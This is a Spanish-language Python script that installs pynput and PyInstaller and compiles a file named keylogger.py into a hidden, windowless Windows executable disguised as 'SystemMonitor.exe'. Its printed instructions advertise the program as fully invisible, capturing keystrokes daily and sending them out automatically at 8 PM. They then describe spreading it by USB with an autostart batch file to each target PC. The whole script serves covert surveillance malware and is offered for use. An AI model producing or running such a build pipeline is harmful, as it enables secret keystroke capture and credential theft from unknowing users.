#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Script de compilación automática
Ejecuta: python compilar.py
"""

import os
import sys
import subprocess
import platform

def print_header(text):
    print("\n" + "="*60)
    print(text.center(60))
    print("="*60 + "\n")

def print_step(step, text):
    print(f"[{step}] {text}")

def print_success(text):
    print(f"    ✓ {text}")

def print_error(text):
    print(f"    ✗ {text}")

def run_command(cmd, hide_output=False):
    """Ejecuta un comando y retorna True si es exitoso"""
    try:
        if hide_output:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            result = subprocess.run(cmd, shell=True)
        return result.returncode == 0
    except Exception as e:
        print(f"    Error: {e}")
        return False

def main():
    print_header("COMPILADOR AUTOMATICO - MONITOR DE SISTEMA")
    
    # Detectar sistema
    arch = "64-bit" if platform.machine().endswith('64') else "32-bit"
    python_bits = platform.architecture()[0]
    print(f"Sistema: Windows {arch}")
    print(f"Python: {sys.version.split()[0]} ({python_bits})")
    print()
    
    # Paso 1: Verificar pip
    print_step("1/5", "Verificando pip...")
    if run_command("python -m pip --version", hide_output=True):
        print_success("pip disponible")
    else:
        print("    Instalando pip...")
        run_command("python -m ensurepip --default-pip")
        run_command("python -m pip install --upgrade pip")
    print()
    
    # Paso 2: Instalar pynput
    print_step("2/5", "Instalando pynput...")
    if run_command("python -m pip install pynput --quiet --disable-pip-version-check", hide_output=True):
        print_success("pynput instalado")
    else:
        print("    Reintentando...")
        run_command("python -m pip install pynput --no-cache-dir")
    print()
    
    # Paso 3: Instalar pyinstaller
    print_step("3/5", "Instalando pyinstaller...")
    if run_command("python -m pip install pyinstaller --quiet --disable-pip-version-check", hide_output=True):
        print_success("pyinstaller instalado")
    else:
        print("    Reintentando...")
        run_command("python -m pip install pyinstaller --no-cache-dir")
    print()
    
    # Paso 4: Verificar archivo
    print_step("4/5", "Verificando keylogger.py...")
    if not os.path.exists("keylogger.py"):
        print_error("No se encuentra keylogger.py")
        print("\nAsegúrate de que keylogger.py esté en la misma carpeta")
        input("\nPresiona Enter para salir...")
        sys.exit(1)
    print_success("Archivo encontrado")
    print()
    
    # Paso 5: Compilar
    print_step("5/5", "Compilando ejecutable...")
    print("    Esto puede tardar 1-2 minutos...\n")
    
    # Limpiar compilaciones anteriores
    if os.path.exists("dist"):
        import shutil
        shutil.rmtree("dist", ignore_errors=True)
    if os.path.exists("build"):
        import shutil
        shutil.rmtree("build", ignore_errors=True)
    
    # Compilar
    compile_cmd = (
        "python -m PyInstaller "
        "--onefile "
        "--noconsole "
        '--name="SystemMonitor" '
        "--hidden-import=pynput.keyboard._win32 "
        "--hidden-import=pynput.mouse._win32 "
        "keylogger.py"
    )
    
    success = run_command(compile_cmd)
    
    # Limpiar temporales
    if os.path.exists("build"):
        import shutil
        shutil.rmtree("build", ignore_errors=True)
    for f in os.listdir("."):
        if f.endswith(".spec"):
            os.remove(f)
    
    print()
    
    # Verificar resultado
    exe_path = os.path.join("dist", "SystemMonitor.exe")
    if success and os.path.exists(exe_path):
        print_header("COMPILACION EXITOSA")
        print(f"✓ Ejecutable generado: {exe_path}")
        
        size = os.path.getsize(exe_path) / (1024 * 1024)
        print(f"✓ Tamaño: {size:.2f} MB")
        
        if "32" in python_bits:
            print("✓ Compatible con Windows 32-bit y 64-bit")
        else:
            print("✓ Compatible solo con Windows 64-bit")
        
        print("\nCARACTERÍSTICAS:")
        print("  • Completamente invisible")
        print("  • Captura: 06:00 - 20:00")
        print("  • Envío automático: 20:00 (8 PM)")
        print("  • Nombre automático del equipo")
        
        print("\nPRÓXIMOS PASOS:")
        print("  1. Copia dist\\SystemMonitor.exe a un USB")
        print("  2. Copia instalar_inicio_automatico.bat")
        print("  3. Ejecuta el .bat en cada PC destino")
        
    else:
        print_header("ERROR EN LA COMPILACIÓN")
        print("No se pudo generar el ejecutable")
        print("\nIntenta ejecutar manualmente:")
        print(compile_cmd)
    
    print()
    input("Presiona Enter para salir...")

if __name__ == "__main__":
    main()